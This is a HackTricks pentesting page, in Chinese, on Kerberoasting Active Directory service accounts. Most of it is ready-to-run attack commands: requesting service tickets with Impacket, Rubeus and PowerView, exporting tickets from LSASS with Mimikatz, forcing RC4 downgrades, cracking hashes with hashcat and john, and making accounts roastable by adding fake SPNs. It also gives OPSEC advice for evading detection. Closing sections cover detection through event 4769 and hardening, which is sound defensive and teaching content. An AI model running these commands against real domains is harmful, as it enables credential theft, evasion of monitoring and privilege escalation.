# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting 主要集中在获取 TGS 票证，特别是与在 Active Directory (AD) 中以用户帐户运行的服务相关的票证，排除计算机帐户。这些票证的加密使用源自用户密码的密钥，从而允许离线凭证破解。使用用户帐户作为服务的标志是非空的 ServicePrincipalName (SPN) 属性。

任何经过身份验证的域用户都可以请求 TGS 票证，因此不需要特殊权限。

### 关键点

- 针对以用户帐户运行的服务的 TGS 票证（即，设置了 SPN 的帐户；不是计算机帐户）。
- 票证使用源自服务帐户密码的密钥进行加密，可以离线破解。
- 不需要提升权限；任何经过身份验证的帐户都可以请求 TGS 票证。

> [!WARNING]
> 大多数公共工具更倾向于请求 RC4-HMAC (etype 23) 服务票证，因为它们比 AES 更容易破解。RC4 TGS 哈希以 `$krb5tgs$23$*` 开头，AES128 以 `$krb5tgs$17$*` 开头，AES256 以 `$krb5tgs$18$*` 开头。然而，许多环境正在转向仅使用 AES。不要假设只有 RC4 是相关的。
> 此外，避免“喷洒和祈祷”式的烤制。Rubeus 的默认 kerberoast 可以查询并请求所有 SPN 的票证，并且会产生噪音。首先枚举并针对有趣的主体。

### 攻击

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
多功能工具，包括 kerberoast 检查：
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- 枚举可进行 Kerberoast 的用户
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- 技术 1：请求 TGS 并从内存中转储
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- 技术 2：自动化工具
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS 请求生成 Windows 安全事件 4769（请求了 Kerberos 服务票证）。

### OPSEC 和仅 AES 环境

- 故意请求 RC4 以便于没有 AES 的账户：
- Rubeus: `/rc4opsec` 使用 tgtdeleg 枚举没有 AES 的账户并请求 RC4 服务票证。
- Rubeus: `/tgtdeleg` 与 kerberoast 一起也会在可能的情况下触发 RC4 请求。
- 烤制仅 AES 账户而不是静默失败：
- Rubeus: `/aes` 枚举启用了 AES 的账户并请求 AES 服务票证（类型 17/18）。
- 如果您已经持有 TGT（PTT 或来自 .kirbi），可以使用 `/ticket:<blob|path>` 与 `/spn:<SPN>` 或 `/spns:<file>` 并跳过 LDAP。
- 目标、限流和减少噪音：
- 使用 `/user:<sam>`、`/spn:<spn>`、`/resultlimit:<N>`、`/delay:<ms>` 和 `/jitter:<1-100>`。
- 使用 `/pwdsetbefore:<MM-dd-yyyy>`（较旧的密码）过滤可能的弱密码，或使用 `/ou:<DN>` 目标特权 OU。

示例（Rubeus）：
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### 破解
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### 持久性 / 滥用

如果您控制或可以修改一个账户，您可以通过添加 SPN 使其可进行 kerberoast：
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
将帐户降级以启用 RC4 以便于破解（需要对目标对象的写入权限）：
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
您可以在此处找到用于kerberoast攻击的有用工具：https://github.com/nidem/kerberoast

如果您在Linux上遇到此错误：`Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`，这可能是由于本地时间偏差。请与DC同步：

- `ntpdate <DC_IP>`（在某些发行版上已弃用）
- `rdate -n <DC_IP>`

### 检测

Kerberoasting可以是隐蔽的。寻找来自DC的事件ID 4769，并应用过滤器以减少噪音：

- 排除服务名称`krbtgt`和以`$`结尾的服务名称（计算机帐户）。
- 排除来自机器帐户的请求（`*$$@*`）。
- 仅成功请求（失败代码`0x0`）。
- 跟踪加密类型：RC4（`0x17`），AES128（`0x11`），AES256（`0x12`）。不要仅对`0x17`发出警报。

示例PowerShell初步分析：
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
额外的想法：

- 基于每个主机/用户的正常 SPN 使用情况建立基线；对来自单个主体的大量不同 SPN 请求进行警报。
- 标记在 AES 加固域中不寻常的 RC4 使用情况。

### 缓解 / 加固

- 对服务使用 gMSA/dMSA 或机器账户。托管账户具有 120+ 字符的随机密码并自动轮换，使离线破解不切实际。
- 通过将 `msDS-SupportedEncryptionTypes` 设置为仅 AES（十进制 24 / 十六进制 0x18）来强制服务账户使用 AES，然后轮换密码以派生 AES 密钥。
- 在可能的情况下，禁用环境中的 RC4 并监控尝试使用 RC4 的情况。在 DC 上，您可以使用 `DefaultDomainSupportedEncTypes` 注册表值来引导未设置 `msDS-SupportedEncryptionTypes` 的账户的默认值。进行彻底测试。
- 从用户账户中删除不必要的 SPN。
- 如果托管账户不可行，请使用长且随机的服务账户密码（25+ 字符）；禁止常见密码并定期审计。

### 无域账户的 Kerberoast（AS 请求的 ST）

在 2022 年 9 月，Charlie Clark 表明，如果主体不需要预身份验证，则可以通过修改请求体中的 sname 来获取服务票证，从而通过精心制作的 KRB_AS_REQ 获取服务票证，实际上获得了服务票证而不是 TGT。这与 AS-REP 烤制相似，并且不需要有效的域凭据。

详细信息请参见 Semperis 的文章“新攻击路径：AS 请求的 ST”。

> [!WARNING]
> 您必须提供用户列表，因为没有有效凭据，您无法使用此技术查询 LDAP。

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
相关

如果您针对 AS-REP 可烤用户，请参见：

{{#ref}}
asreproast.md
{{#endref}}

## 参考

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Microsoft 的指导以帮助减轻 Kerberoasting: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Rubeus Roasting 文档: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
